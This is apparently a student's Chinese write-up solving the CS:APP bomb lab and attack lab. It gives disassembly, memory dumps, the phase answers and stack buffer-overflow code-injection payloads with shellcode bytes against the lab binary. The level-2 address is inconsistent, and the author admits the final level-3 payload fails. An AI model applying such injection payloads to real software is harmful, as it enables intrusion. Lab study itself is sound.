## bomb-lab
### bomb-lab-phase_2
```
0x0000000000400efc <+0>:   push   %rbp
   0x0000000000400efd <+1>:   push   %rbx
   0x0000000000400efe <+2>:   sub    $0x28,%rsp
   0x0000000000400f02 <+6>:   mov    %rsp,%rsi
   0x0000000000400f05 <+9>:   callq  0x40145c <read_six_numbers>
   0x0000000000400f0a <+14>:  cmpl   $0x1,(%rsp)
   0x0000000000400f0e <+18>:  je     0x400f30 <phase_2+52>
   0x0000000000400f10 <+20>:  callq  0x40143a <explode_bomb>
   0x0000000000400f15 <+25>:  jmp    0x400f30 <phase_2+52>
   0x0000000000400f17 <+27>:  mov    -0x4(%rbx),%eax
   0x0000000000400f1a <+30>:  add    %eax,%eax
   0x0000000000400f1c <+32>:  cmp    %eax,(%rbx)
   0x0000000000400f1e <+34>:  je     0x400f25 <phase_2+41>
   0x0000000000400f20 <+36>:  callq  0x40143a <explode_bomb>
   0x0000000000400f25 <+41>:  add    $0x4,%rbx
   0x0000000000400f29 <+45>:  cmp    %rbp,%rbx
   0x0000000000400f2c <+48>:  jne    0x400f17 <phase_2+27>
   0x0000000000400f2e <+50>:  jmp    0x400f3c <phase_2+64>
   0x0000000000400f30 <+52>:  lea    0x4(%rsp),%rbx
   0x0000000000400f35 <+57>:  lea    0x18(%rsp),%rbp
   0x0000000000400f3a <+62>:  jmp    0x400f17 <phase_2+27>
   0x0000000000400f3c <+64>:  add    $0x28,%rsp
```
我们的输入存储在0x6037d0，这个地址保存在rdi中
调用read_six_numbers函数，参数为rdi中我们输入字符串的地址和rsi中的0x7fffffffded8

8个参数已经准备好 分别是 rdi输入字符串 rsi格式化字符串 rdx rcx r8 r9 (rsp) (rsp+8)

调用sscanf，格式化字符串保存在0x4025c3，该函数返回匹配的个数，如果个数大于5，则不会爆炸

调用sscanf前的寄存器情况如下
```
rax            0x0                 0
rbx            0x402210            4203024
rcx            0x7fffffffdea4      140737488346788
rdx            0x7fffffffdea0      140737488346784
rsi            0x4025c3            4203971
rdi            0x6037d0            6305744
rbp            0x0                 0x0
rsp            0x7fffffffde80      0x7fffffffde80
r8             0x7fffffffdea8      140737488346792
r9             0x7fffffffdeac      140737488346796
r10            0xfffffffffffff28e  -3442
r11            0x246               582
r12            0x400c90            4197520
r13            0x7fffffffdfd0      140737488347088
r14            0x0                 0
r15            0x0                 0
rip            0x40148a            0x40148a <read_six_numbers+46>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0

```

回到phase_2函数，此时rsp的值和rdx的值相同，也就是第一个参数和1进行比较
取rsp+4也就是第二个参数保存到rbx中
将0x7fffffffdeb8保存到rbp作为循环退出的条件，然后跳转至0x400f17,开始循环
将上一次的运算结果\*2，保存在eax，再和我们所输入的字符串进行对比，相等就继续和rbp比较，如果小于rbp
所以最后的6个数字就是 1 2 4 8 16 32

### bomb-lab-phase_3
```
0x0000000000400f43 <+0>:   sub    $0x18,%rsp
   0x0000000000400f47 <+4>:   lea    0xc(%rsp),%rcx
   0x0000000000400f4c <+9>:   lea    0x8(%rsp),%rdx
   0x0000000000400f51 <+14>:  mov    $0x4025cf,%esi
   0x0000000000400f56 <+19>:  mov    $0x0,%eax
   0x0000000000400f5b <+24>:  callq  0x400bf0 <__isoc99_sscanf@plt>
   0x0000000000400f60 <+29>:  cmp    $0x1,%eax
   0x0000000000400f63 <+32>:  jg     0x400f6a <phase_3+39>
   0x0000000000400f65 <+34>:  callq  0x40143a <explode_bomb>
   0x0000000000400f6a <+39>:  cmpl   $0x7,0x8(%rsp)
   0x0000000000400f6f <+44>:  ja     0x400fad <phase_3+106>
   0x0000000000400f71 <+46>:  mov    0x8(%rsp),%eax
   0x0000000000400f75 <+50>:  jmpq   *0x402470(,%rax,8)
   0x0000000000400f7c <+57>:  mov    $0xcf,%eax
   0x0000000000400f81 <+62>:  jmp    0x400fbe <phase_3+123>
   0x0000000000400f83 <+64>:  mov    $0x2c3,%eax
   0x0000000000400f88 <+69>:  jmp    0x400fbe <phase_3+123>
   0x0000000000400f8a <+71>:  mov    $0x100,%eax
   0x0000000000400f8f <+76>:  jmp    0x400fbe <phase_3+123>
   0x0000000000400f91 <+78>:  mov    $0x185,%eax
   0x0000000000400f96 <+83>:  jmp    0x400fbe <phase_3+123>
   0x0000000000400f98 <+85>:  mov    $0xce,%eax
   0x0000000000400f9d <+90>:  jmp    0x400fbe <phase_3+123>
   0x0000000000400f9f <+92>:  mov    $0x2aa,%eax
   0x0000000000400fa4 <+97>:  jmp    0x400fbe <phase_3+123>
   0x0000000000400fa6 <+99>:  mov    $0x147,%eax
   0x0000000000400fab <+104>: jmp    0x400fbe <phase_3+123>
   0x0000000000400fad <+106>: callq  0x40143a <explode_bomb>
   0x0000000000400fb2 <+111>: mov    $0x0,%eax
   0x0000000000400fb7 <+116>: jmp    0x400fbe <phase_3+123>
   0x0000000000400fb9 <+118>: mov    $0x137,%eax
   0x0000000000400fbe <+123>: cmp    0xc(%rsp),%eax
   0x0000000000400fc2 <+127>: je     0x400fc9 <phase_3+134>
   0x0000000000400fc4 <+129>: callq  0x40143a <explode_bomb>
   0x0000000000400fc9 <+134>: add    $0x18,%rsp
   0x0000000000400fcd <+138>: retq   
```
第一部分和上一个phase相同，准备调用sscanf的参数，我们的输入保存在0x603820，格式化字符串保存在0x4025cf，两个参数分别保存在(rsp+8)和(rsp+c)

将(rsp+8)和7比较，如果比7大就炸了，0x402470存储了switch编译出来的速查表，当rax为1时，查表中的第0+1项，得到地址0x400fb9（这里注意先执行偏移的加运算，再执行取值），再将第二个参数和对应的0x137对比，如果相同就过了

### bomb-lab-phase_4
```
=> 0x000000000040100c <+0>:   sub    $0x18,%rsp
   0x0000000000401010 <+4>:   lea    0xc(%rsp),%rcx
   0x0000000000401015 <+9>:   lea    0x8(%rsp),%rdx
   0x000000000040101a <+14>:  mov    $0x4025cf,%esi
   0x000000000040101f <+19>:  mov    $0x0,%eax
   0x0000000000401024 <+24>:  callq  0x400bf0 <__isoc99_sscanf@plt>
   0x0000000000401029 <+29>:  cmp    $0x2,%eax
   0x000000000040102c <+32>:  jne    0x401035 <phase_4+41>
   0x000000000040102e <+34>:  cmpl   $0xe,0x8(%rsp)
   0x0000000000401033 <+39>:  jbe    0x40103a <phase_4+46>
   0x0000000000401035 <+41>:  callq  0x40143a <explode_bomb>
   0x000000000040103a <+46>:  mov    $0xe,%edx
   0x000000000040103f <+51>:  mov    $0x0,%esi
   0x0000000000401044 <+56>:  mov    0x8(%rsp),%edi
   0x0000000000401048 <+60>:  callq  0x400fce <func4>
   0x000000000040104d <+65>:  test   %eax,%eax
   0x000000000040104f <+67>:  jne    0x401058 <phase_4+76>
   0x0000000000401051 <+69>:  cmpl   $0x0,0xc(%rsp)
   0x0000000000401056 <+74>:  je     0x40105d <phase_4+81>
   0x0000000000401058 <+76>:  callq  0x40143a <explode_bomb>
   0x000000000040105d <+81>:  add
```
和phase_3相同，两个参数保存在(rsp+8)和(rsp+c)，0x40104d处的指令要求func4返回值为0，0x401051处的指令要求第二个参数为0

第一个参数和0xe比较，如果比0xe大就炸了

第一个参数和0x0,0xe进入func4函数，根据汇编写出c代码如下
```
Dump of assembler code for function func4:
=> 0x0000000000400fce <+0>:   sub    $0x8,%rsp
   0x0000000000400fd2 <+4>:   mov    %edx,%eax
   0x0000000000400fd4 <+6>:   sub    %esi,%eax
   0x0000000000400fd6 <+8>:   mov    %eax,%ecx
   0x0000000000400fd8 <+10>:  shr    $0x1f,%ecx
   0x0000000000400fdb <+13>:  add    %ecx,%eax
   0x0000000000400fdd <+15>:  sar    %eax
   0x0000000000400fdf <+17>:  lea    (%rax,%rsi,1),%ecx
   0x0000000000400fe2 <+20>:  cmp    %edi,%ecx
   0x0000000000400fe4 <+22>:  jle    0x400ff2 <func4+36>
   0x0000000000400fe6 <+24>:  lea    -0x1(%rcx),%edx
   0x0000000000400fe9 <+27>:  callq  0x400fce <func4>
   0x0000000000400fee <+32>:  add    %eax,%eax
   0x0000000000400ff0 <+34>:  jmp    0x401007 <func4+57>
   0x0000000000400ff2 <+36>:  mov    $0x0,%eax
   0x0000000000400ff7 <+41>:  cmp    %edi,%ecx
   0x0000000000400ff9 <+43>:  jge    0x401007 <func4+57>
   0x0000000000400ffb <+45>:  lea    0x1(%rcx),%esi
   0x0000000000400ffe <+48>:  callq  0x400fce <func4>
   0x0000000000401003 <+53>:  lea    0x1(%rax,%rax,1),%eax
   0x0000000000401007 <+57>:  add    $0x8,%rsp
   0x000000000040100b <+61>:  retq  
```
```c
int func4(int a, int b, int c)
{
   int eax = c;
   eax = eax - b;
   
   int ecx = eax;
   ecx = ecx >> 0x1f;

   eax = eax + ecx;
   eax = eax >> 1;

   ecx = eax + b;

   if(ecx > a)
   {
      c = ecx - 1;
      eax = func4(a,b,c);   //要用eax接收返回值
      eax = eax << 1;
   }
   else
   {
      eax = 0;
      if(ecx < a)
      {
         b = ecx + 1;
         eax = func4(a,b,c);     //要用eax接收返回值
         eax = eax + eax + 1;
      }
   }
   return eax;

}
```
从return eax = 0反推参数a可能的初始值，外层的else中有eax=0，如果不进入内层的if，满足a <= ecx，就可以直接return，但外层的if包括了ecx > a的判断，因此只需要让a = ecx就能过关了(PS:这里无意中发现1 0和3 0也能过关，但我在调c的时候1 0和3 0最后的eax不是0，一阵操作后发现是因为return出来的值没有覆盖到eax，以后用c模拟寄存器直接用全局变量了)


### bomb-lab-phase_5
```
Dump of assembler code for function phase_5:
=> 0x0000000000401062 <+0>:   push   %rbx
   0x0000000000401063 <+1>:   sub    $0x20,%rsp
   0x0000000000401067 <+5>:   mov    %rdi,%rbx
   0x000000000040106a <+8>:   mov    %fs:0x28,%rax
   0x0000000000401073 <+17>:  mov    %rax,0x18(%rsp)
   0x0000000000401078 <+22>:  xor    %eax,%eax
   0x000000000040107a <+24>:  callq  0x40131b <string_length>
   0x000000000040107f <+29>:  cmp    $0x6,%eax
   0x0000000000401082 <+32>:  je     0x4010d2 <phase_5+112>
   0x0000000000401084 <+34>:  callq  0x40143a <explode_bomb>
   0x0000000000401089 <+39>:  jmp    0x4010d2 <phase_5+112>
   0x000000000040108b <+41>:  movzbl (%rbx,%rax,1),%ecx
   0x000000000040108f <+45>:  mov    %cl,(%rsp)
   0x0000000000401092 <+48>:  mov    (%rsp),%rdx
   0x0000000000401096 <+52>:  and    $0xf,%edx
   0x0000000000401099 <+55>:  movzbl 0x4024b0(%rdx),%edx
   0x00000000004010a0 <+62>:  mov    %dl,0x10(%rsp,%rax,1)
   0x00000000004010a4 <+66>:  add    $0x1,%rax
   0x00000000004010a8 <+70>:  cmp    $0x6,%rax
   0x00000000004010ac <+74>:  jne    0x40108b <phase_5+41>
   0x00000000004010ae <+76>:  movb   $0x0,0x16(%rsp)
   0x00000000004010b3 <+81>:  mov    $0x40245e,%esi
   0x00000000004010b8 <+86>:  lea    0x10(%rsp),%rdi
   0x00000000004010bd <+91>:  callq  0x401338 <strings_not_equal>
   0x00000000004010c2 <+96>:  test   %eax,%eax
   0x00000000004010c4 <+98>:  je     0x4010d9 <phase_5+119>
   0x00000000004010c6 <+100>: callq  0x40143a <explode_bomb>
--Type <RET> for more, q to quit, c to continue without paging--
   0x00000000004010cb <+105>: nopl   0x0(%rax,%rax,1)
   0x00000000004010d0 <+110>: jmp    0x4010d9 <phase_5+119>
   0x00000000004010d2 <+112>: mov    $0x0,%eax
   0x00000000004010d7 <+117>: jmp    0x40108b <phase_5+41>
   0x00000000004010d9 <+119>: mov    0x18(%rsp),%rax
   0x00000000004010de <+124>: xor    %fs:0x28,%rax
   0x00000000004010e7 <+133>: je     0x4010ee <phase_5+140>
   0x00000000004010e9 <+135>: callq  0x400b30 <__stack_chk_fail@plt>
   0x00000000004010ee <+140>: add    $0x20,%rsp
   0x00000000004010f2 <+144>: pop    %rbx
   0x00000000004010f3 <+145>: retq  
```
输入字符串保存在0x6038c0，这里的fs:0x28是canary(0xddd343c33687bc00)

经过string_length函数，要求长度为6

0x4024b0是一个字符替换表（输入字符的低4位作为偏移索引）

目标字符串在0x40245e，值为flyers，偏移值分别为0x9,0xf,0xe,0x5,0x6,0x7，找到6个低4位为这个偏移值的字符即可

9?>567


### bomb-lab-phase_6
```
=> 0x00000000004010f4 <+0>:   push   %r14
   0x00000000004010f6 <+2>:   push   %r13
   0x00000000004010f8 <+4>:   push   %r12
   0x00000000004010fa <+6>:   push   %rbp
   0x00000000004010fb <+7>:   push   %rbx
   0x00000000004010fc <+8>:   sub    $0x50,%rsp
   0x0000000000401100 <+12>:  mov    %rsp,%r13
   0x0000000000401103 <+15>:  mov    %rsp,%rsi
   0x0000000000401106 <+18>:  callq  0x40145c <read_six_numbers>
   0x000000000040110b <+23>:  mov    %rsp,%r14
   0x000000000040110e <+26>:  mov    $0x0,%r12d
   0x0000000000401114 <+32>:  mov    %r13,%rbp
   0x0000000000401117 <+35>:  mov    0x0(%r13),%eax
   0x000000000040111b <+39>:  sub    $0x1,%eax
   0x000000000040111e <+42>:  cmp    $0x5,%eax
   0x0000000000401121 <+45>:  jbe    0x401128 <phase_6+52>
   0x0000000000401123 <+47>:  callq  0x40143a <explode_bomb>
   0x0000000000401128 <+52>:  add    $0x1,%r12d
   0x000000000040112c <+56>:  cmp    $0x6,%r12d
   0x0000000000401130 <+60>:  je     0x401153 <phase_6+95>
   0x0000000000401132 <+62>:  mov    %r12d,%ebx
   0x0000000000401135 <+65>:  movslq %ebx,%rax
   0x0000000000401138 <+68>:  mov    (%rsp,%rax,4),%eax
   0x000000000040113b <+71>:  cmp    %eax,0x0(%rbp)
   0x000000000040113e <+74>:  jne    0x401145 <phase_6+81>
   0x0000000000401140 <+76>:  callq  0x40143a <explode_bomb>
   0x0000000000401145 <+81>:  add    $0x1,%ebx
   0x0000000000401148 <+84>:  cmp    $0x5,%ebx
   0x000000000040114b <+87>:  jle    0x401135 <phase_6+65>
   0x000000000040114d <+89>:  add    $0x4,%r13
   0x0000000000401151 <+93>:  jmp    0x401114 <phase_6+32>
   
   0x0000000000401153 <+95>:  lea    0x18(%rsp),%rsi
   0x0000000000401158 <+100>: mov    %r14,%rax
   0x000000000040115b <+103>: mov    $0x7,%ecx
   0x0000000000401160 <+108>: mov    %ecx,%edx
   0x0000000000401162 <+110>: sub    (%rax),%edx
   0x0000000000401164 <+112>: mov    %edx,(%rax)
   0x0000000000401166 <+114>: add    $0x4,%rax
   0x000000000040116a <+118>: cmp    %rsi,%rax
   0x000000000040116d <+121>: jne    0x401160 <phase_6+108>

   0x000000000040116f <+123>: mov    $0x0,%esi
   0x0000000000401174 <+128>: jmp    0x401197 <phase_6+163>
   0x0000000000401176 <+130>: mov    0x8(%rdx),%rdx
   0x000000000040117a <+134>: add    $0x1,%eax
   0x000000000040117d <+137>: cmp    %ecx,%eax
   0x000000000040117f <+139>: jne    0x401176 <phase_6+130>
   0x0000000000401181 <+141>: jmp    0x401188 <phase_6+148>
   0x0000000000401183 <+143>: mov    $0x6032d0,%edx
   0x0000000000401188 <+148>: mov    %rdx,0x20(%rsp,%rsi,2)
   0x000000000040118d <+153>: add    $0x4,%rsi
   0x0000000000401191 <+157>: cmp    $0x18,%rsi
   0x0000000000401195 <+161>: je     0x4011ab <phase_6+183>
   0x0000000000401197 <+163>: mov    (%rsp,%rsi,1),%ecx
   0x000000000040119a <+166>: cmp    $0x1,%ecx
   0x000000000040119d <+169>: jle    0x401183 <phase_6+143>
--Type <RET> for more, q to quit, c to continue without paging--
   0x000000000040119f <+171>: mov    $0x1,%eax
   0x00000000004011a4 <+176>: mov    $0x6032d0,%edx
   0x00000000004011a9 <+181>: jmp    0x401176 <phase_6+130>
   0x00000000004011ab <+183>: mov    0x20(%rsp),%rbx
   0x00000000004011b0 <+188>: lea    0x28(%rsp),%rax
   0x00000000004011b5 <+193>: lea    0x50(%rsp),%rsi
   0x00000000004011ba <+198>: mov    %rbx,%rcx
   0x00000000004011bd <+201>: mov    (%rax),%rdx
   0x00000000004011c0 <+204>: mov    %rdx,0x8(%rcx)
   0x00000000004011c4 <+208>: add    $0x8,%rax
   0x00000000004011c8 <+212>: cmp    %rsi,%rax
   0x00000000004011cb <+215>: je     0x4011d2 <phase_6+222>
   0x00000000004011cd <+217>: mov    %rdx,%rcx
   0x00000000004011d0 <+220>: jmp    0x4011bd <phase_6+201>
   0x00000000004011d2 <+222>: movq   $0x0,0x8(%rdx)
   0x00000000004011da <+230>: mov    $0x5,%ebp
   0x00000000004011df <+235>: mov    0x8(%rbx),%rax
   0x00000000004011e3 <+239>: mov    (%rax),%eax
   0x00000000004011e5 <+241>: cmp    %eax,(%rbx)
   0x00000000004011e7 <+243>: jge    0x4011ee <phase_6+250>
   0x00000000004011e9 <+245>: callq  0x40143a <explode_bomb>
   0x00000000004011ee <+250>: mov    0x8(%rbx),%rbx
   0x00000000004011f2 <+254>: sub    $0x1,%ebp
   0x00000000004011f5 <+257>: jne    0x4011df <phase_6+235>
   0x00000000004011f7 <+259>: add    $0x50,%rsp
   0x00000000004011fb <+263>: pop    %rbx
   0x00000000004011fc <+264>: pop    %rbp
   0x00000000004011fd <+265>: pop    %r12
--Type <RET> for more, q to quit, c to continue without paging--
   0x00000000004011ff <+267>: pop    %r13
   0x0000000000401201 <+269>: pop    %r14
   0x0000000000401203 <+271>: retq   
```
read_six_numbers读入6的格式化数字字符，保存在r13(0x7fffffffdde0)（因为后面有用到r13的地方，所以这里猜测是保存在r13里面）

首先检测第一个数字，如果大于等于7就炸了，然后跳转到0x401128

r12d是r12的低32位，初始值为0，通过add+cmp操作猜测这个r12应该是一个6次循环的控制变量

```
   0x0000000000401132 <+62>:  mov    %r12d,%ebx
   0x0000000000401135 <+65>:  movslq %ebx,%rax
   0x0000000000401138 <+68>:  mov    (%rsp,%rax,4),%eax
   0x000000000040113b <+71>:  cmp    %eax,0x0(%rbp)
   0x000000000040113e <+74>:  jne    0x401145 <phase_6+81>
```
由于输入的字符串地址存在rsp中，这里通过偏移4\*rax的方式访问第二个个字符，然后和(rbp)也就是第一个字符（0x7fffffffdde0）比较，如果相等就炸了

```
   0x0000000000401145 <+81>:  add    $0x1,%ebx
   0x0000000000401148 <+84>:  cmp    $0x5,%ebx
   0x000000000040114b <+87>:  jle    0x401135 <phase_6+65>
```
又是add+cmp，看成循环，这里ebx的值从2开始，也就是要循环4次，相当于从第3个字符开始遍历字符串，和第一个字符比较

```
   0x000000000040114d <+89>:  add    $0x4,%r13
   0x0000000000401151 <+93>:  jmp    0x401114 <phase_6+32>
```
这里是接外层循环，两层循环的结果就是整个字符串中不能出现相同的字符

```
   0x0000000000401153 <+95>:  lea    0x18(%rsp),%rsi
   0x0000000000401158 <+100>: mov    %r14,%rax
   0x000000000040115b <+103>: mov    $0x7,%ecx
   0x0000000000401160 <+108>: mov    %ecx,%edx
   0x0000000000401162 <+110>: sub    (%rax),%edx
   0x0000000000401164 <+112>: mov    %edx,(%rax)
   0x0000000000401166 <+114>: add    $0x4,%rax
   0x000000000040116a <+118>: cmp    %rsi,%rax
   0x000000000040116d <+121>: jne    0x401160 <phase_6+108>
```
这里又是一个循环，字符串的初始指针保存在r14，rsi作为循环结束条件

将输入的字符串进行7-x的操作（如123456变为654321）

```
  0x000000000040116f <+123>:  mov    $0x0,%esi
   0x0000000000401174 <+128>: jmp    0x401197 <phase_6+163>
```
这种非jcc的跳转表示很可能又要有循环操作

```
   0x0000000000401176 <phase_6+130>:   mov    0x8(%rdx),%rdx
   0x000000000040117a <phase_6+134>:   add    $0x1,%eax
   0x000000000040117d <phase_6+137>:   cmp    %ecx,%eax
   0x000000000040117f <phase_6+139>:   jne    0x401176 <phase_6+130>
   0x0000000000401181 <phase_6+141>:   jmp    0x401188 <phase_6+148>
   0x0000000000401183 <phase_6+143>:   mov    $0x6032d0,%edx
   0x0000000000401188 <phase_6+148>:   mov    %rdx,0x20(%rsp,%rsi,2)
   0x000000000040118d <phase_6+153>:   add    $0x4,%rsi
   0x0000000000401191 <phase_6+157>:   cmp    $0x18,%rsi
   0x0000000000401195 <phase_6+161>:   je     0x4011ab <phase_6+183>
=> 0x0000000000401197 <phase_6+163>:   mov    (%rsp,%rsi,1),%ecx
   0x000000000040119a <phase_6+166>:   cmp    $0x1,%ecx
   0x000000000040119d <phase_6+169>:   jle    0x401183 <phase_6+143>
   0x000000000040119f <phase_6+171>:   mov    $0x1,%eax
   0x00000000004011a4 <phase_6+176>:   mov    $0x6032d0,%edx
   0x00000000004011a9 <phase_6+181>:   jmp    0x401176 <phase_6+130>
```
将输入的每个字符和0x1对比，假设我们的输入为654321，当输入的字符大于0x1的时候，跳转到0x401176查地址表，这里其实像是一个链表，(rdx+8)为当前节点中指向下一个节点的地址，然后向后查找n-1次（0x6032d0为基址），这里模拟一下输入为6时的查找情况。
首先读取(0x6032d0+8)为6032e0
读取(6032e0+8)为6032f0
读取(6032f0+8)为603300
读取(603300+8)为603310
读取(603310+8)为603320

将这个0x603320保存在(0x7fffffffdde0+rsi\*2+0x20)，根据add $0x4,%rsi和cmp $0x18,%rsi判断出关于rsi的循环共有6次，如果值是1的话直接把基址扔进去就可以了
最后的结果如下
```
0x7fffffffdde0:   0x06  0x00  0x00  0x00  0x05  0x00  0x00  0x00
0x7fffffffdde8:   0x04  0x00  0x00  0x00  0x03  0x00  0x00  0x00
0x7fffffffddf0:   0x02  0x00  0x00  0x00  0x01  0x00  0x00  0x00
0x7fffffffddf8:   0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
0x7fffffffde00:   0x20  0x33  0x60  0x00  0x00  0x00  0x00  0x00
0x7fffffffde08:   0x10  0x33  0x60  0x00  0x00  0x00  0x00  0x00
0x7fffffffde10:   0x00  0x33  0x60  0x00  0x00  0x00  0x00  0x00
0x7fffffffde18:   0xf0  0x32  0x60  0x00  0x00  0x00  0x00  0x00
0x7fffffffde20:   0xe0  0x32  0x60  0x00  0x00  0x00  0x00  0x00
0x7fffffffde28:   0xd0  0x32  0x60  0x00  0x00  0x00  0x00  0x00
```

```
   0x00000000004011ab <+183>: mov    0x20(%rsp),%rbx
   0x00000000004011b0 <+188>: lea    0x28(%rsp),%rax
   0x00000000004011b5 <+193>: lea    0x50(%rsp),%rsi
   0x00000000004011ba <+198>: mov    %rbx,%rcx
   0x00000000004011bd <+201>: mov    (%rax),%rdx
   0x00000000004011c0 <+204>: mov    %rdx,0x8(%rcx)
   0x00000000004011c4 <+208>: add    $0x8,%rax
   0x00000000004011c8 <+212>: cmp    %rsi,%rax
   0x00000000004011cb <+215>: je     0x4011d2 <phase_6+222>
   0x00000000004011cd <+217>: mov    %rdx,%rcx
   0x00000000004011d0 <+220>: jmp    0x4011bd <phase_6+201>
   0x00000000004011d2 <+222>: movq   $0x0,0x8(%rdx)
   0x00000000004011da <+230>: mov    $0x5,%ebp
   0x00000000004011df <+235>: mov    0x8(%rbx),%rax
   0x00000000004011e3 <+239>: mov    (%rax),%eax
   0x00000000004011e5 <+241>: cmp    %eax,(%rbx)
   0x00000000004011e7 <+243>: jge    0x4011ee <phase_6+250>
   0x00000000004011e9 <+245>: callq  0x40143a <explode_bomb>
   0x00000000004011ee <+250>: mov    0x8(%rbx),%rbx
   0x00000000004011f2 <+254>: sub    $0x1,%ebp
   0x00000000004011f5 <+257>: jne    0x4011df <phase_6+235>
```
   0x00000000004011bd <+201>: mov    (%rax),%rdx
   0x00000000004011c0 <+204>: mov    %rdx,0x8(%rcx)
将后一个值的地址保存在前一个地址+8的位置上，也就是构成一个新链表，最后的结果就是
0x603320:xxx ----> 0x603310:xxx ----> ...

   0x00000000004011d2 <+222>: movq   $0x0,0x8(%rdx)
末尾的指针设置为null



   0x00000000004011e3 <+239>: mov    (%rax),%eax
   0x00000000004011e5 <+241>: cmp    %eax,(%rbx)
   0x00000000004011e7 <+243>: jge    0x4011ee <phase_6+250>
后一个节点和前一个节点的值（int型）做比较，如果前一个大于等于后一个就ok，否则就炸了，因此我们先看一下这6个节点的数据

0x603320: 0x1bb
0x603310: 0x1dd
0x603300: 0x2b3
0x6032f0: 0x39c
0x6032e0: 0x0a8
0x6032d0: 0x14c

从大到小排序为 3 4 5 6 1 2
再配合之前的7-x ，结果为4,3,2,1,6,5



## attack-lab
### level-1(code-injection)
目标：利用test函数中调用的getbuf函数（getbuf中调用了gets），成功执行touch1函数

```
=> 0x0000000000401968 <+0>:	sub    $0x8,%rsp
   0x000000000040196c <+4>:	mov    $0x0,%eax
   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq   

```
先看一下test函数的反汇编，找到返回地址为0x401976
```
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
=> 0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq  
```
```
0x5561dc78:	0x34333231	0x00003635	0x00000000	0x00000000
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x55586000	0x00000000	0x00401976	0x00000000
0x5561dca8:	0x00000009	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x5561dcc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dcd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dce8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dcf8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dd08:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
```
进入到getbuf函数，找到0x401976，由于变量是从低地址往高地址写，在一定长度后总会覆盖到返回地址，这个长度的值可以从汇编对rsp的操作进行计算，也可以通过观察内存布局来计算，在这里应该就是0x28

接着找到touch1函数的地址为0x4017c0

最后的payload就是
"A"\*40+"\xc0\x17\x40"

### level-2(code-injection)

touch2的地址为0x4017ec

由于写在栈上的数据是从低地址向高地址，指令的执行也是从低地址向高地址，因此如果把指令写在栈上，返回地址覆盖为栈上指令的地址，再执行一些操作（比如传递参数），最后ret到目标函数就可以成功执行了

* 生成byte-code
1. write a file example.s
```
# Example of hand-generated assembly code
pushq	$0xabcdef	# Push value onto stack
addq	$17,%rax	# Add 17 to %rax
movl	%eax,%edx	# Copy lower 32 bits to %edx
```
2. 
```
unix> gcc -c example.s
unix> objdump -d example.o
```

首先构造出传递参数的汇编指令
```
movq	$0x59b997fa,%rdi	#cookie放在参数中
pushq	$0x4017c0			#目标函数地址入栈
retq 						#跳转到目标函数地址
```

生成的byte-code为
```
48 c7 c7 fa 97 b9 59 
68 ec 17 40 00
c3
```

byte-code的地址为%rsp(0x5561dc78)，最后的payload为
```
%rsp:	0x5561dc78:		48 c7 c7 fa 97 b9 59 
						68 ec 17 40 00
						c3
						41 41 41 41 41 41 41 41
						41 41 41 41 41 41 41 41
						41 41 41 41 41 41 41 41
						41 41 41
%rsp+0x28: 				78 dc 61 55 
```

### level-3(code-injection)
`r -i ./solved-m3/phase3/test -q`

touch3的地址为0x4018fa

* gdb调试技巧
r命令后可以带参数
r -i ./solved-m3/phase3/test -q

先写一个简单的字符串转hex的脚本
```py
input_str = '59b997fa'

output_ascii = ''

for char in input_str:
	output_ascii += str(hex(ord(char)))[2:]+' '
print(output_ascii)
```

构造shellcode
```
mov $0x5561dc97,%rdi
pushq $0x4018fa
ret
```

gcc -c byte-code.s
```
48 c7 c7 97 dc 61 55
68 fa 18 40 00
c3
```

payload
```
48 c7 c7 97 dc 61 55
68 fa 18 40 00
c3
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 
35 39 62 39 39 37 66 61 00
78 dc 61 55
```

如果这样构造payload，会因为总结2中的覆盖问题，导致传入的cookie被覆盖掉，对此的解决办法有两个：把传入的cookie字符串放在低地址上，或者手动将栈抬高

重新排列上面的payload

```
48 c7 c7 97 dc 61 55 68
fa 18 40 00 c3 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 35
39 62 39 39 37 66 61 00
78 dc 61 55
```

如果采用第一种方法，这里栈帧内能够写入字符串的地址范围为0x5561dc78~0x5561dca0，而后面需要占用的语句分别为

```
touch3函数中：

push rbx 8个字节 覆盖掉 78 dc 61 55

call hexmatch 8个字节  覆盖掉 39 62 39 39 37 66 61 00

hexmatch函数中： 

push r12 8个字节  覆盖掉 41 41 41 41 41 41 41 35

push rbp 8字节  覆盖掉 41 41 41 41 41 41 41 41

push rbx 8字节  覆盖掉 fa 18 40 00 c3 41 41 41
```

![image-20210205163344966](C:\Users\xiaofei01\AppData\Roaming\Typora\typora-user-images\image-20210205163344966.png)

重新构造payload，字符串放在0x5561dc78，shellcode放在0x5561dc88

```
mov $0x5561dc88,%rdi
pushq $0x4018fa
ret
```

```
35 39 62 39 39 37 66 61 
00 41 41 41 41 41 41 41 
48 c7 c7 78 dc 61 55
68 fa 18 40 00
c3
41 41 41 41 41 41 41 41
41 41 41
88 dc 61 55
```

结果发现还是不行，看了下答案，发现是可以写在栈帧外的（学到了，我太菜了）

```
